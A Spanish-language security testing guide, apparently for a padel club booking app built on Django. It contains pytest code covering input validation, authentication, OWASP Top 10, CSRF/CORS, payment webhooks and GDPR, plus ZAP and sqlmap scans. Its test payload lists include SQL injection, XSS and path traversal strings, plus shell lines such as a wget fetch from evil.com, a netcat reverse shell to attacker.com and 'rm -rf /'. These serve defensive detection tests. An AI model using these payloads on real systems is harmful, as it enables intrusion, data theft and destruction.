# ðŸ”’ Security Vulnerability Tests

## ðŸ“‹ Resumen

Esta guÃ­a detalla los tests de seguridad para identificar y prevenir vulnerabilidades, incluyendo OWASP Top 10, autenticaciÃ³n, autorizaciÃ³n, y protecciÃ³n de datos.

## ðŸŽ¯ Objetivos de Testing

### Cobertura de Seguridad
- **OWASP Top 10**: 100% cobertura
- **Authentication**: Tests exhaustivos
- **Authorization**: VerificaciÃ³n completa de permisos
- **Data Protection**: EncriptaciÃ³n y privacidad
- **Input Validation**: SanitizaciÃ³n completa
- **Security Headers**: ConfiguraciÃ³n correcta
- **API Security**: Rate limiting y protecciÃ³n

### Vulnerabilidades a Cubrir
- âœ… SQL Injection
- âœ… XSS (Cross-Site Scripting)
- âœ… CSRF (Cross-Site Request Forgery)
- âœ… Authentication Bypass
- âœ… Authorization Flaws
- âœ… Sensitive Data Exposure
- âœ… XML/XXE Attacks
- âœ… Insecure Deserialization

## ðŸ§ª Unit Tests

### 1. Input Validation Tests
```python
# backend/tests/unit/security/test_input_validation.py
from django.test import TestCase
from apps.security.validators import InputValidator, SQLInjectionDetector
from apps.security.sanitizers import HTMLSanitizer, ScriptSanitizer

class InputValidationTest(TestCase):
    """Test input validation and sanitization"""
    
    def setUp(self):
        self.validator = InputValidator()
        self.sql_detector = SQLInjectionDetector()
        self.html_sanitizer = HTMLSanitizer()
        
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1#",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('dir'); --",
            "${1+1}",
            "' WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in sql_payloads:
            is_malicious = self.sql_detector.is_sql_injection(payload)
            self.assertTrue(
                is_malicious,
                f"Failed to detect SQL injection: {payload}"
            )
            
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=\"alert('XSS')\">"
        ]
        
        for payload in xss_payloads:
            sanitized = self.html_sanitizer.sanitize(payload)
            
            # Should not contain executable scripts
            self.assertNotIn('<script', sanitized.lower())
            self.assertNotIn('javascript:', sanitized.lower())
            self.assertNotIn('onerror=', sanitized.lower())
            self.assertNotIn('onload=', sanitized.lower())
            self.assertNotIn('onfocus=', sanitized.lower())
            
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& net user",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; rm -rf /",
            "|| wget http://evil.com/shell.sh",
            "; nc -e /bin/sh attacker.com 4444"
        ]
        
        for payload in command_payloads:
            is_safe = self.validator.is_safe_for_shell(payload)
            self.assertFalse(
                is_safe,
                f"Failed to detect command injection: {payload}"
            )
            
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for payload in path_payloads:
            is_safe = self.validator.is_safe_path(payload)
            self.assertFalse(
                is_safe,
                f"Failed to detect path traversal: {payload}"
            )

class PasswordSecurityTest(TestCase):
    """Test password security measures"""
    
    def test_password_strength_validation(self):
        """Test password strength requirements"""
        from apps.security.password import PasswordStrengthValidator
        
        validator = PasswordStrengthValidator()
        
        # Weak passwords that should fail
        weak_passwords = [
            "password",
            "12345678",
            "qwerty123",
            "admin123",
            "Password1",  # No special char
            "password!",  # No uppercase
            "PASSWORD!",  # No lowercase
            "Pass!234",   # Too short
        ]
        
        for password in weak_passwords:
            is_strong, errors = validator.validate(password)
            self.assertFalse(
                is_strong,
                f"Weak password accepted: {password}"
            )
            
        # Strong passwords that should pass
        strong_passwords = [
            "MyStr0ng!P@ssw0rd",
            "C0mpl3x#P@ssphrase",
            "S3cur3*Pass_2023",
            "Val!d@t10n$Test"
        ]
        
        for password in strong_passwords:
            is_strong, errors = validator.validate(password)
            self.assertTrue(
                is_strong,
                f"Strong password rejected: {password}, errors: {errors}"
            )
            
    def test_password_history_check(self):
        """Test password history validation"""
        from apps.security.password import PasswordHistoryChecker
        
        user = UserFactory()
        checker = PasswordHistoryChecker()
        
        # Store password history
        old_passwords = [
            "OldPass1!",
            "OldPass2@",
            "OldPass3#"
        ]
        
        for pwd in old_passwords:
            checker.add_to_history(user, pwd)
            
        # Check reuse prevention
        for pwd in old_passwords:
            can_use = checker.can_use_password(user, pwd)
            self.assertFalse(
                can_use,
                f"Allowed reuse of old password: {pwd}"
            )
            
        # New password should be allowed
        can_use = checker.can_use_password(user, "NewPass4$")
        self.assertTrue(can_use)
```

### 2. Authentication Security Tests
```python
# backend/tests/unit/security/test_authentication_security.py
from django.test import TestCase
from apps.security.auth import AuthenticationManager, TokenValidator
import jwt
from datetime import datetime, timedelta

class AuthenticationSecurityTest(TestCase):
    """Test authentication security measures"""
    
    def setUp(self):
        self.auth_manager = AuthenticationManager()
        self.token_validator = TokenValidator()
        
    def test_brute_force_protection(self):
        """Test brute force attack protection"""
        attacker_ip = "192.168.1.100"
        target_email = "admin@example.com"
        
        # Simulate failed login attempts
        for i in range(10):
            self.auth_manager.record_failed_attempt(
                email=target_email,
                ip_address=attacker_ip
            )
            
        # Check if account/IP is locked
        is_locked = self.auth_manager.is_locked(
            email=target_email,
            ip_address=attacker_ip
        )
        
        self.assertTrue(is_locked)
        
        # Check lockout duration
        lockout_info = self.auth_manager.get_lockout_info(
            email=target_email,
            ip_address=attacker_ip
        )
        
        self.assertGreater(lockout_info['remaining_time'], 0)
        self.assertEqual(lockout_info['attempts'], 10)
        
    def test_session_fixation_prevention(self):
        """Test session fixation attack prevention"""
        from django.contrib.sessions.models import Session
        
        # Create initial session
        old_session_key = self.client.session.session_key
        
        # Login
        user = UserFactory()
        self.client.force_login(user)
        
        # Session key should change after login
        new_session_key = self.client.session.session_key
        
        self.assertNotEqual(old_session_key, new_session_key)
        
        # Old session should be invalidated
        if old_session_key:
            with self.assertRaises(Session.DoesNotExist):
                Session.objects.get(session_key=old_session_key)
                
    def test_jwt_token_security(self):
        """Test JWT token security features"""
        user = UserFactory()
        
        # Generate token
        token = self.auth_manager.generate_token(user)
        
        # Decode without verification (for testing)
        decoded = jwt.decode(token, options={"verify_signature": False})
        
        # Check required claims
        required_claims = ['exp', 'iat', 'jti', 'user_id']
        for claim in required_claims:
            self.assertIn(claim, decoded)
            
        # Check expiration
        exp = datetime.fromtimestamp(decoded['exp'])
        now = datetime.now()
        
        # Token should expire within reasonable time
        self.assertLess(
            (exp - now).total_seconds(),
            3600  # 1 hour max
        )
        
        # Test token tampering detection
        tampered_token = token[:-10] + "tampereddata"
        
        is_valid = self.token_validator.validate(tampered_token)
        self.assertFalse(is_valid)
        
    def test_password_reset_token_security(self):
        """Test password reset token security"""
        from apps.security.tokens import PasswordResetTokenGenerator
        
        generator = PasswordResetTokenGenerator()
        user = UserFactory()
        
        # Generate token
        token = generator.make_token(user)
        
        # Token should be valid
        is_valid = generator.check_token(user, token)
        self.assertTrue(is_valid)
        
        # Token should be one-time use
        user.password = "changed"
        user.save()
        
        is_valid = generator.check_token(user, token)
        self.assertFalse(is_valid)
        
        # Token should expire
        old_token = generator.make_token(user)
        
        # Simulate time passing
        with freeze_time(datetime.now() + timedelta(hours=25)):
            is_valid = generator.check_token(user, old_token)
            self.assertFalse(is_valid)
```

### 3. Authorization Security Tests
```python
# backend/tests/unit/security/test_authorization_security.py
from django.test import TestCase
from apps.security.permissions import PermissionManager, AccessControlList

class AuthorizationSecurityTest(TestCase):
    """Test authorization security measures"""
    
    def setUp(self):
        self.permission_manager = PermissionManager()
        self.acl = AccessControlList()
        
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        regular_user = UserFactory(role='player')
        admin_user = UserFactory(role='admin')
        
        # Regular user tries to access admin endpoint
        can_access = self.permission_manager.can_access(
            user=regular_user,
            resource='admin_panel',
            action='view'
        )
        
        self.assertFalse(can_access)
        
        # Regular user tries to modify their own role
        can_modify = self.permission_manager.can_modify_user_role(
            actor=regular_user,
            target_user=regular_user,
            new_role='admin'
        )
        
        self.assertFalse(can_modify)
        
        # Admin can modify other user's role
        can_modify = self.permission_manager.can_modify_user_role(
            actor=admin_user,
            target_user=regular_user,
            new_role='coach'
        )
        
        self.assertTrue(can_modify)
        
    def test_object_level_permissions(self):
        """Test object-level permission checks"""
        user1 = UserFactory()
        user2 = UserFactory()
        
        # Create reservations
        reservation1 = ReservationFactory(user=user1)
        reservation2 = ReservationFactory(user=user2)
        
        # User can only modify their own reservations
        can_modify_own = self.acl.can_modify_object(
            user=user1,
            obj=reservation1
        )
        self.assertTrue(can_modify_own)
        
        can_modify_others = self.acl.can_modify_object(
            user=user1,
            obj=reservation2
        )
        self.assertFalse(can_modify_others)
        
    def test_role_based_access_control(self):
        """Test RBAC implementation"""
        from apps.security.rbac import RoleBasedAccessControl
        
        rbac = RoleBasedAccessControl()
        
        # Define roles and permissions
        roles = {
            'player': ['view_courts', 'create_reservation'],
            'coach': ['view_courts', 'create_reservation', 'view_students'],
            'admin': ['*']  # All permissions
        }
        
        # Test permission checking
        player = UserFactory(role='player')
        coach = UserFactory(role='coach')
        admin = UserFactory(role='admin')
        
        # Player permissions
        self.assertTrue(rbac.has_permission(player, 'view_courts'))
        self.assertFalse(rbac.has_permission(player, 'view_students'))
        
        # Coach permissions
        self.assertTrue(rbac.has_permission(coach, 'view_students'))
        
        # Admin permissions
        self.assertTrue(rbac.has_permission(admin, 'delete_user'))
        self.assertTrue(rbac.has_permission(admin, 'any_permission'))
```

## ðŸ”Œ Integration Tests

### 1. OWASP Top 10 Tests
```python
# backend/tests/integration/security/test_owasp_top10.py
from rest_framework.test import APITestCase
from django.test import override_settings

class OWASPTop10Test(APITestCase):
    """Test OWASP Top 10 vulnerabilities"""
    
    def test_a01_broken_access_control(self):
        """Test for broken access control vulnerabilities"""
        # Create users with different roles
        admin = UserFactory(is_staff=True)
        regular_user = UserFactory()
        
        # Create admin-only resource
        admin_resource = AdminConfigFactory()
        
        # Try to access admin resource as regular user
        self.client.force_authenticate(user=regular_user)
        
        response = self.client.get(
            f'/api/v1/admin/config/{admin_resource.id}/'
        )
        
        # Should be forbidden
        self.assertEqual(response.status_code, 403)
        
        # Try to escalate privileges
        response = self.client.patch(
            f'/api/v1/users/{regular_user.id}/',
            {'is_staff': True}
        )
        
        self.assertEqual(response.status_code, 403)
        
    def test_a02_cryptographic_failures(self):
        """Test for cryptographic failures"""
        # Test sensitive data encryption
        user = UserFactory()
        
        # Create payment with sensitive data
        response = self.client.post(
            '/api/v1/payments/',
            {
                'amount': 100,
                'card_number': '4111111111111111',
                'cvv': '123'
            }
        )
        
        # Check data is not stored in plain text
        from apps.payments.models import Payment
        payment = Payment.objects.latest('id')
        
        # Card number should be encrypted or tokenized
        self.assertNotEqual(payment.card_number, '4111111111111111')
        self.assertNotIn('4111111111111111', str(payment.card_number))
        
        # CVV should not be stored at all
        self.assertFalse(hasattr(payment, 'cvv'))
        
    def test_a03_injection(self):
        """Test for injection vulnerabilities"""
        # SQL Injection attempt
        response = self.client.get(
            '/api/v1/clubs/',
            {'name': "'; DROP TABLE clubs; --"}
        )
        
        # Should handle safely
        self.assertIn(response.status_code, [200, 400])
        
        # Verify table still exists
        from apps.clubs.models import Club
        self.assertTrue(Club.objects.exists())
        
        # NoSQL Injection attempt
        response = self.client.post(
            '/api/v1/search/',
            {
                'query': {
                    '$where': 'this.password == "admin"'
                }
            },
            format='json'
        )
        
        # Should not execute JavaScript
        self.assertNotEqual(response.status_code, 500)
        
    def test_a04_insecure_design(self):
        """Test for insecure design patterns"""
        # Test rate limiting on sensitive endpoints
        login_attempts = []
        
        for i in range(20):
            response = self.client.post(
                '/api/v1/auth/login/',
                {
                    'email': 'test@example.com',
                    'password': f'wrong{i}'
                }
            )
            login_attempts.append(response.status_code)
            
        # Should start rate limiting
        self.assertIn(429, login_attempts)
        
        # Test account enumeration prevention
        response1 = self.client.post(
            '/api/v1/auth/reset-password/',
            {'email': 'exists@example.com'}
        )
        
        response2 = self.client.post(
            '/api/v1/auth/reset-password/',
            {'email': 'notexists@example.com'}
        )
        
        # Responses should be identical to prevent enumeration
        self.assertEqual(response1.status_code, response2.status_code)
        self.assertEqual(response1.data.get('message'), response2.data.get('message'))
        
    def test_a05_security_misconfiguration(self):
        """Test for security misconfiguration"""
        # Test debug mode is off
        response = self.client.get('/api/v1/debug/')
        self.assertEqual(response.status_code, 404)
        
        # Test security headers
        response = self.client.get('/api/v1/clubs/')
        
        # Check security headers
        self.assertIn('X-Content-Type-Options', response)
        self.assertEqual(response['X-Content-Type-Options'], 'nosniff')
        
        self.assertIn('X-Frame-Options', response)
        self.assertEqual(response['X-Frame-Options'], 'DENY')
        
        self.assertIn('Strict-Transport-Security', response)
        
        # Test error messages don't leak information
        response = self.client.get('/api/v1/nonexistent/')
        
        # Should not reveal framework details
        self.assertNotIn('Django', response.content.decode())
        self.assertNotIn('Traceback', response.content.decode())
```

### 2. API Security Tests
```python
# backend/tests/integration/security/test_api_security.py
class APISecurityTest(APITestCase):
    """Test API-specific security measures"""
    
    def test_csrf_protection(self):
        """Test CSRF protection on state-changing operations"""
        # Get CSRF token
        response = self.client.get('/api/v1/csrf/')
        csrf_token = response.cookies.get('csrftoken')
        
        # Try POST without CSRF token
        response = self.client.post(
            '/api/v1/reservations/',
            {'court_id': 1, 'date': '2023-12-01'},
            HTTP_X_CSRFTOKEN=''
        )
        
        # Should be forbidden
        self.assertEqual(response.status_code, 403)
        
        # Try with valid CSRF token
        response = self.client.post(
            '/api/v1/reservations/',
            {'court_id': 1, 'date': '2023-12-01'},
            HTTP_X_CSRFTOKEN=csrf_token
        )
        
        # Should work (or fail with validation, not CSRF)
        self.assertNotEqual(response.status_code, 403)
        
    def test_cors_configuration(self):
        """Test CORS is properly configured"""
        # Test preflight request
        response = self.client.options(
            '/api/v1/clubs/',
            HTTP_ORIGIN='https://evil.com',
            HTTP_ACCESS_CONTROL_REQUEST_METHOD='POST'
        )
        
        # Should not allow evil origin
        self.assertNotEqual(
            response.get('Access-Control-Allow-Origin'),
            'https://evil.com'
        )
        
        # Test allowed origin
        response = self.client.options(
            '/api/v1/clubs/',
            HTTP_ORIGIN='https://app.padelyzer.com',
            HTTP_ACCESS_CONTROL_REQUEST_METHOD='GET'
        )
        
        # Should allow legitimate origin
        self.assertEqual(
            response.get('Access-Control-Allow-Origin'),
            'https://app.padelyzer.com'
        )
        
    def test_api_versioning_security(self):
        """Test API versioning doesn't expose vulnerabilities"""
        # Try to access deprecated/removed endpoints
        deprecated_endpoints = [
            '/api/v0/users/',  # Old version
            '/api/users/',     # No version
            '/api/v1.0/users/', # Different format
        ]
        
        for endpoint in deprecated_endpoints:
            response = self.client.get(endpoint)
            
            # Should not be accessible
            self.assertIn(response.status_code, [404, 410])
```

## ðŸ”„ E2E Flow Tests

### 1. Authentication Flow Security Test
```python
# backend/tests/e2e/security/test_auth_flow_security.py
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

class AuthenticationFlowSecurityE2ETest(TestCase):
    """Test authentication flow security"""
    
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.driver = webdriver.Chrome()
        
    def test_secure_login_flow(self):
        """Test secure login flow implementation"""
        self.driver.get(f"{self.live_server_url}/login")
        
        # Check for secure connection
        self.assertTrue(
            self.driver.current_url.startswith('https://'),
            "Login page not using HTTPS"
        )
        
        # Check password field attributes
        password_field = self.driver.find_element(By.ID, "password")
        
        # Should have proper attributes
        self.assertEqual(password_field.get_attribute('type'), 'password')
        self.assertEqual(password_field.get_attribute('autocomplete'), 'off')
        
        # Test password visibility toggle security
        toggle_btn = self.driver.find_element(By.ID, "toggle-password")
        toggle_btn.click()
        
        # Type should change but value should remain
        self.assertEqual(password_field.get_attribute('type'), 'text')
        
        # Test login attempt monitoring
        for i in range(5):
            self.driver.find_element(By.ID, "email").send_keys("test@example.com")
            password_field.send_keys("wrongpassword")
            self.driver.find_element(By.ID, "submit").click()
            
            # Clear fields
            self.driver.find_element(By.ID, "email").clear()
            password_field.clear()
            
        # Should show rate limiting or captcha
        time.sleep(1)
        
        # Check for rate limiting message or captcha
        page_source = self.driver.page_source
        self.assertTrue(
            'too many attempts' in page_source.lower() or
            'captcha' in page_source.lower()
        )
```

### 2. Payment Security Flow Test
```python
# backend/tests/e2e/security/test_payment_security.py
class PaymentSecurityE2ETest(TestCase):
    """Test payment flow security"""
    
    def test_secure_payment_flow(self):
        """Test complete secure payment flow"""
        user = UserFactory()
        self.client.force_authenticate(user=user)
        
        # Step 1: Create payment intent
        response = self.client.post(
            '/api/v1/payments/create-intent/',
            {
                'amount': 50.00,
                'currency': 'EUR',
                'description': 'Court reservation'
            }
        )
        
        self.assertEqual(response.status_code, 200)
        
        # Verify client secret is returned (not full secret)
        self.assertIn('client_secret', response.data)
        self.assertTrue(response.data['client_secret'].endswith('_secret_'))
        
        # Step 2: Confirm payment (frontend would use Stripe.js)
        payment_intent_id = response.data['id']
        
        # Simulate webhook from Stripe
        webhook_payload = {
            'type': 'payment_intent.succeeded',
            'data': {
                'object': {
                    'id': payment_intent_id,
                    'amount': 5000,  # In cents
                    'currency': 'eur',
                    'status': 'succeeded'
                }
            }
        }
        
        # Test webhook signature verification
        import stripe
        webhook_secret = settings.STRIPE_WEBHOOK_SECRET
        
        # Generate valid signature
        timestamp = int(time.time())
        payload = json.dumps(webhook_payload)
        signature = stripe.WebhookSignature._compute_signature(
            f"{timestamp}.{payload}",
            webhook_secret
        )
        
        response = self.client.post(
            '/api/v1/payments/webhook/',
            data=payload,
            content_type='application/json',
            HTTP_STRIPE_SIGNATURE=f"t={timestamp},v1={signature}"
        )
        
        self.assertEqual(response.status_code, 200)
        
        # Test invalid signature
        response = self.client.post(
            '/api/v1/payments/webhook/',
            data=payload,
            content_type='application/json',
            HTTP_STRIPE_SIGNATURE="invalid_signature"
        )
        
        self.assertEqual(response.status_code, 400)
```

### 3. Data Privacy Flow Test
```python
# backend/tests/e2e/security/test_data_privacy.py
class DataPrivacyE2ETest(TestCase):
    """Test data privacy and GDPR compliance"""
    
    def test_user_data_export(self):
        """Test user can export their data"""
        user = UserFactory()
        
        # Create user data
        ReservationFactory.create_batch(5, user=user)
        PaymentFactory.create_batch(3, user=user)
        
        self.client.force_authenticate(user=user)
        
        # Request data export
        response = self.client.post('/api/v1/users/me/export-data/')
        
        self.assertEqual(response.status_code, 202)
        task_id = response.data['task_id']
        
        # Poll for completion
        for _ in range(10):
            status_response = self.client.get(
                f'/api/v1/tasks/{task_id}/status/'
            )
            
            if status_response.data['status'] == 'completed':
                # Download exported data
                download_url = status_response.data['result']['download_url']
                
                download_response = self.client.get(download_url)
                self.assertEqual(download_response.status_code, 200)
                
                # Verify data format and content
                exported_data = json.loads(download_response.content)
                
                self.assertIn('user_profile', exported_data)
                self.assertIn('reservations', exported_data)
                self.assertIn('payments', exported_data)
                
                # Verify sensitive data is included for owner
                self.assertEqual(
                    exported_data['user_profile']['email'],
                    user.email
                )
                
                break
                
            time.sleep(1)
            
    def test_user_data_deletion(self):
        """Test user account deletion and data removal"""
        user = UserFactory()
        
        # Create related data
        reservations = ReservationFactory.create_batch(3, user=user)
        payments = PaymentFactory.create_batch(2, user=user)
        
        self.client.force_authenticate(user=user)
        
        # Request account deletion
        response = self.client.post(
            '/api/v1/users/me/delete/',
            {'confirm': True, 'password': 'testpass123'}
        )
        
        self.assertEqual(response.status_code, 200)
        
        # Verify user is anonymized, not hard deleted
        user.refresh_from_db()
        self.assertFalse(user.is_active)
        self.assertTrue(user.email.startswith('deleted_'))
        
        # Verify related data is anonymized
        for reservation in reservations:
            reservation.refresh_from_db()
            self.assertTrue(reservation.user_anonymized)
```

## ðŸ”’ Penetration Testing

### Automated Security Scanning
```python
# backend/tests/security/penetration/test_automated_scanning.py
import subprocess
from django.test import LiveServerTestCase

class AutomatedSecurityScanTest(LiveServerTestCase):
    """Run automated security scans"""
    
    def test_owasp_zap_scan(self):
        """Run OWASP ZAP security scan"""
        # Start ZAP in daemon mode
        zap_process = subprocess.Popen([
            'zap.sh', '-daemon',
            '-host', '127.0.0.1',
            '-port', '8090'
        ])
        
        time.sleep(10)  # Wait for ZAP to start
        
        try:
            # Run active scan
            result = subprocess.run([
                'zap-cli', 'active-scan',
                '--self-contained',
                self.live_server_url
            ], capture_output=True)
            
            # Get alerts
            alerts = subprocess.run([
                'zap-cli', 'alerts',
                '-l', 'High'
            ], capture_output=True, text=True)
            
            # Should have no high-risk alerts
            high_risk_alerts = alerts.stdout.strip().split('\n')
            self.assertEqual(
                len([a for a in high_risk_alerts if a]),
                0,
                f"High risk vulnerabilities found: {high_risk_alerts}"
            )
            
        finally:
            zap_process.terminate()
            
    def test_sqlmap_scan(self):
        """Run SQLMap to test for SQL injection"""
        # Create test endpoint
        test_url = f"{self.live_server_url}/api/v1/clubs/?name=test"
        
        # Run sqlmap
        result = subprocess.run([
            'sqlmap',
            '-u', test_url,
            '--batch',
            '--level=2',
            '--risk=2',
            '--technique=BEUSTQ',
            '--tamper=space2comment'
        ], capture_output=True, text=True)
        
        # Check results
        output = result.stdout.lower()
        
        self.assertNotIn('vulnerable', output)
        self.assertNotIn('injectable', output)
```

## ðŸ“Š Security Metrics

### Security Coverage Tests
```python
# backend/tests/security/metrics/test_security_coverage.py
class SecurityCoverageTest(TestCase):
    """Test security coverage metrics"""
    
    def test_authentication_coverage(self):
        """Test all endpoints require authentication"""
        from django.urls import get_resolver
        
        # Get all API endpoints
        resolver = get_resolver()
        api_patterns = self._get_api_patterns(resolver)
        
        # Public endpoints whitelist
        public_endpoints = [
            '/api/v1/auth/login/',
            '/api/v1/auth/register/',
            '/api/v1/auth/reset-password/',
            '/api/v1/public/'
        ]
        
        # Test each endpoint
        unauthenticated_access = []
        
        for pattern in api_patterns:
            if any(pattern.startswith(public) for public in public_endpoints):
                continue
                
            # Try to access without authentication
            response = self.client.get(pattern)
            
            if response.status_code not in [401, 403]:
                unauthenticated_access.append(pattern)
                
        self.assertEqual(
            len(unauthenticated_access),
            0,
            f"Endpoints accessible without auth: {unauthenticated_access}"
        )
        
    def test_input_validation_coverage(self):
        """Test all inputs are validated"""
        from django.forms import ModelForm
        from rest_framework import serializers
        
        # Get all serializers
        serializer_classes = [
            cls for cls in serializers.Serializer.__subclasses__()
        ]
        
        # Check validation
        for serializer_class in serializer_classes:
            if hasattr(serializer_class, 'Meta'):
                fields = serializer_class.Meta.fields
                
                # Check each field has validation
                for field_name in fields:
                    field = serializer_class._declared_fields.get(field_name)
                    
                    if field:
                        # Should have validators
                        self.assertTrue(
                            hasattr(field, 'validators') or
                            hasattr(field, 'validate') or
                            field.read_only,
                            f"{serializer_class.__name__}.{field_name} lacks validation"
                        )
```

## ðŸŽ¯ Test Execution Commands

### Run All Security Tests
```bash
# Unit tests
pytest tests/unit/security/ -v

# Integration tests
pytest tests/integration/security/ -v

# E2E tests
pytest tests/e2e/security/ -v

# All security tests
pytest tests/ -k security -v

# With coverage
pytest tests/ -k security --cov=apps.security --cov-report=html
```

### Run Specific Security Tests
```bash
# OWASP tests
pytest tests/ -k "owasp" -v

# Authentication tests
pytest tests/ -k "auth" -v

# Injection tests
pytest tests/ -k "injection" -v

# Penetration tests
pytest tests/security/penetration/ -v
```

### Security Scanning Commands
```bash
# Run OWASP ZAP scan
zap-cli quick-scan --self-contained http://localhost:8000

# Run Bandit security linter
bandit -r backend/ -ll

# Run Safety check for dependencies
safety check

# Run Django security check
python manage.py check --deploy
```

---

**Siguiente**: [Integration Tests](20-Integration-Tests.md) â†’